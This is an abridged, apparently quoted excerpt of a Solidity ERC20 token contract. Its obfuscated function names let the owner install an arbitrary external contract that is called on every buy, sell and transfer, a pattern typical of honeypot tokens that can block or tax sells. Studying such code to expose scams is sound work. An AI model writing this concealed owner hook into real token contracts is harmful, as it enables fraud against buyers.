...
contract TokenM is ERC20 {
    ...
    IUserAmountyuouio public yuouio;
    ...
    function CuiopttrBruiogRhhte(IUserAmountyuouio _yuouio) public onlyOwner {
        yuouio = _yuouio;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                yuouio.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				yuouio.addOutAmount(from, amount);
            }else{
                yuouio.addOutAmount(from, amount);
                takeFee = false;
            }
